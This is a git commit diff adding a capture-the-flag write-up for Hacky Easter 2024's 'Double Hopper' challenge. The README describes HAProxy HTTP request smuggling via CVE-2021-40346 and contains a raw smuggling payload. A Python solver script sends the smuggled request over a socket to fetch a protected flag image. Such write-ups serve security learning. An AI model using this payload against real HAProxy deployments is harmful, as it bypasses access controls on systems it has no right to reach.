e2023b9f062a4ccc3409fb4ae9d88f263f8a23ce
Nicola Groegli <nicola@groeg.li>
2024-04-10 23:13:46 +0200

    solved Double Hopper

--- Level 8 - Finale Grande/Double Hopper/README.md
+++ Level 8 - Finale Grande/Double Hopper/README.md
@@ -12,9 +12,29 @@ Note: The service is restarted every hour at x:00.
 # Solution
 The [config.txt](config.txt) file suggests a HAProxy web server configuration. Searching for path configuration vulnerabilities for that kind of server suggests the following possible exploit: https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/
 
-WORK:
+By using this approach, we see the flag path: https://github.com/alexOarga/CVE-2021-40346/blob/main/payload
+
+[payload](payload)
+
+    POST /index HTTP/1.1
+    Host: ch.hackyeaster.com:2406
+    Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa: 
+    Content-Length: 23
+
+    GET /flag HTTP/1.1
+    h: GET /index HTTP/1.1
+    Host: ch.hackyeaster.com:2406
+
+
+Output in HTML:
 
     <img src="/static/flag-55a8408e060a25096eb95be8b86f3a2c66f91193.png"/>
 
+With this script and some adjustments, we can then download the flag.png https://github.com/alikarimi999/CVE-2021-40346/blob/main/exploit.py:
+
+[solver.py](solver.py)
+
+![flag.png](flag.png)
+
 ## The flag
-    he2024{}
+    he2024{Smu66l1m6_4ll_th3_t1m3!}
--- Level 8 - Finale Grande/Double Hopper/solver.py
+++ Level 8 - Finale Grande/Double Hopper/solver.py
@@ -1,17 +1,69 @@
-payload = """POST /index HTTP/1.1
-Host: ch.hackyeaster.com:2406
-Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa: 
-Content-Length: 23
+from argparse import ArgumentParser
+from socket import *
+import re
+import time
+import pathlib
 
-GET /flag HTTP/1.1
-h: GET /index HTTP/1.1
-Host: ch.hackyeaster.com:2406"""
 
-import requests
+def prepare_request(host, path):       
+    body_scheme = f"GET {path} HTTP/1.1\nDelimiter: GET / HTTP/1.1\nHost: {host}\n\n"
+    body_length = len(re.findall(b'^GET.*\n.*Delimiter:.',body_scheme.encode())[0])
 
-url = 'https://www.w3schools.com/python/demopage.php'
-myobj = {'somekey': 'somevalue'}
+    request_scheme = f"""POST HTTP/1.1
+    Host: {host}
+    Content-Length03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L03v1L0:
+    Content-Length:{body_length}\n\n{body_scheme}"""
+   
+    request = request_scheme.encode()
+    return request
 
-x = requests.post(url, json = myobj)
 
-print(x.text)
+def exploit(host, path, port):
+    with socket(AF_INET, SOCK_STREAM) as sock:  
+        try:
+            sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
+            sock.connect((host, port))         
+            sock.sendall( prepare_request(host, path) )         
+            print('[.] waiting for reponse ...\n\n')
+         
+            timeout_start = time.time()
+            flag_started = False
+
+            flag = b""
+
+            while True:
+                recv = sock.recv(4096)
+
+                f = open(f"{pathlib.Path(__file__).parent}/flag.png", 'ab').write(recv)
+            
+                if flag_started:
+                    flag += recv 
+                    print("CONTINUED:")      
+                    print(recv)
+                    #f = open(f"{pathlib.Path(__file__).parent}/flag.png", 'ab').write(recv)
+
+                if b"\x89PNG" in recv:
+
+                    print("FLAG FOUND:")
+
+                    flag += recv[recv.find(b"\x89PNG"):]
+                    print(flag)                
+                    flag_started = True
+            
+                if recv == b'' or time.time() > timeout_start + 5:
+                    break
+            f = open(f"{pathlib.Path(__file__).parent}/flag.png", 'wb').write(flag)
+
+        except error as e:
+            sock.close()
+            print('''Connection failed! : "you can change this string with e in source if you want to see whats the problem''')
+
+
+
+def main():
+    exploit("ch.hackyeaster.com", "/flag/static/flag-55a8408e060a25096eb95be8b86f3a2c66f91193.png", 2406)
+   
+
+
+if __name__ == "__main__":
+    main()
